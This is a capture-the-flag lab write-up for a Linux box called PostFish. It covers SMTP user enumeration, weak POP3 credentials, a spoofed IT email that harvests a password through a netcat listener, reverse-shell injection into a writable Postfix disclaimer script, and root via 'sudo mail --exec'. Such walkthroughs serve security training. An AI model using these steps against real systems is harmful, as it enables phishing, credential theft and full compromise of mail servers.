#Linux #SMTP #Phishing #POP3 #CewL #CredentialInterception #PostfixDisclaimer #FilterGroup #GTFOBins #mail

## Overview

PostFish is a Linux box that chains social engineering through actual mail infrastructure into a privilege escalation via an abusable Postfix hook. The path starts with SMTP user enumeration and POP3 mailbox access, escalates through a crafted phishing email that tricks an automated system into POSTing credentials to an attacker-controlled listener, and finally abuses group membership in `filter` to inject a reverse shell into Postfix's disclaimer script, then escapes to root via `mail` with a GTFOBins sudo trick.

## Recon

### Port Scan

```sh
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s
```

The web app redirects to `http://postfish.off/` (added to `/etc/hosts`). The landing page lists company staff:

```
Claire Madison  - HR Specialist
Mike Ross       - IT Pro
Brian Moore     - Sales Manager
Sarah Lorem     - Legal Advisor
```

### SMTP User Enumeration

Running `smtp-user-enum` against standard system accounts confirmed many exist. A CeWL wordlist built from the website's content found two more:

```
192.168.183.137: Sales exists
192.168.183.137: Legal exists
```

> **Why CeWL helps here:** `smtp-user-enum` only confirms or denies names you give it. CeWL scrapes the target site and builds a wordlist from its own content, department names, staff names, product words. Companies frequently use department names as mail aliases, and "Sales" proved to be one here.

## Foothold

### POP3 Mailbox Access

`sales:sales` authenticated to the POP3 service:

```sh
telnet 192.168.183.137 110
USER sales
+OK
PASS sales
+OK Logged in.
```

Reading the single email in the inbox reveals a message from `it@postfish.off` mentioning upcoming password reset links sent to the Sales team.

### Credential Interception via SMTP Phishing

The password reset system is automated: send an email from `it@postfish.off` to a user with a link, and the target's browser or mail client follows it, POSTing credentials. Setting up a netcat listener on port 80, then sending a crafted email spoofing IT to `brian.moore@postfish.off`:

```sh
nc -v postfish.off 25
220 postfish.off ESMTP Postfix (Ubuntu)
helo test
250 postfish.off
MAIL FROM: it@postfish.off
250 2.1.0 Ok
RCPT TO: brian.moore@postfish.off
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: Password reset process

Hi Brian,

Please follow this link to reset your password: http://192.168.45.244/

Regards,

.
250 2.0.0 Ok: queued as 75D8745441
QUIT
```

> **Why SMTP spoofing works here:** Postfix on this box accepted mail from any `MAIL FROM` address without authentication. Many internal mail systems trust that senders are who they claim to be, especially from `localhost` or internal networks. This lets an attacker impersonate any address the system will relay.

The listener catches an HTTP POST from the server containing Brian's credentials in the form body:

```sh
sudo rlwrap nc -lvnp 80
...
first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%40postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confirm_password%3DEternaLSunshinE
```

Credentials extracted:

```
brian.moore : EternaLSunshinE
```

SSH access works:

```sh
ssh brian.moore@192.168.183.137
brian.moore@postfish:~$
```

Local flag:

```sh
brian.moore@postfish:~$ cat local.txt
‹redacted›
```

## Privilege Escalation

### Postfix Disclaimer Script Injection

LinPEAS flags a file readable to `brian.moore` but not world-readable:

```
/etc/postfix/disclaimer
```

Researching Postfix disclaimers: when a `disclaimer_address` is configured, any email passing through the server triggers `/etc/postfix/disclaimer`, which appends the contents of `disclaimer.txt` to the message. The `brian.moore` user is a member of the `filter` group, which has write access to this file.

Adding a bash reverse shell to the top of `/etc/postfix/disclaimer` using `nano`, then triggering it by sending any email through the server:

```sh
nc -v postfish.off 25
MAIL FROM: it@postfish.off
RCPT TO: brian.moore@postfish.off
DATA
Shell please!
.
```

Shell arrives as user `filter`:

```sh
rlwrap nc -lvnp 443
connect to [192.168.45.244] from (UNKNOWN) [192.168.183.137] 58538
filter@postfish:/var/spool/postfix$ whoami
filter
```

### GTFOBins: mail with sudo

```sh
User filter may run the following commands on postfish:
    (ALL) NOPASSWD: /usr/bin/mail *
```

GTFOBins documents that `mail` can spawn an interactive shell via its `--exec` flag:

```sh
sudo mail --exec='!/bin/sh'
whoami
root
```

## Root

```sh
cd /root
cat proof.txt
‹redacted›
```

## Takeaways

- **Real mail infrastructure is a phishing target.** An unauthenticated SMTP relay let an attacker impersonate IT and capture credentials through the server's own automated password reset flow.
- **Group membership determines what scripts you can modify.** Membership in `filter` isn't glamorous, but write access to a Postfix hook script means any email delivery becomes a code execution trigger.
- **GTFOBins covers a lot of `sudo` entries.** `mail`, `less`, `awk`, `find`, and hundreds of other binaries can escalate privileges when run with sudo. Check every binary in `sudo -l` output.
